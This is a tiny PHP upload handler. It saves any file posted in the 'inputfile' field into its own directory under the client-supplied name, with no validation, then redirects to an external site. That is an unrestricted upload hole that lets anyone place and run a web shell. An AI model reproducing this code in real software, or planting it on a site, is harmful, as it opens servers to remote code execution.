<?php

if(isset($_FILES)&&$_FILES['inputfile']['error']==0){
$destiation_dir=dirname(__FILE__).'/'.$_FILES['inputfile']['name'];
move_uploaded_file($_FILES['inputfile']['tmp_name'],$destiation_dir);
}
else{
}
header('Location:http://docsfera.ru/index.php');
?>